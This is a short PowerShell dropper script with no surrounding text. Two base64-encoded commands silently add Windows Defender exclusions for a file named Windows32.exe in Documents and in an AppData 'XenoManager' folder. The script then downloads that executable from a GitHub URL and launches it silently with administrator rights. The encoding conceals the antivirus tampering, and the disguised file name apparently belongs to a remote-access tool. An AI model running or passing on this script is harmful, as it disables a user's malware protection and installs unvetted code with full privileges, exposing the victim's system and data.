powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwBjAHUAbQBlAG4AdABzAFwAVwBpAG4AZABvAHcAcwAzADIALgBlAHgAZQAiACAALQBGAG8AcgBjAGUA
powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAWABlAG4AbwBNAGEAbgBhAGcAZQByAFwAVwBpAG4AZABvAHcAcwAzADIALgBlAHgAZQBcACIAIAAtAEYAbwByAGMAZQA=
Invoke-WebRequest -Uri "https://github.com/nomitaned/e/raw/refs/heads/main/Windows32.exe" -OutFile "$env:USERPROFILE\Documents\Windows32.exe"
Start-Process "$env:USERPROFILE\Documents\Windows32.exe" -ArgumentList '/silent' -Wait -Verb RunAs
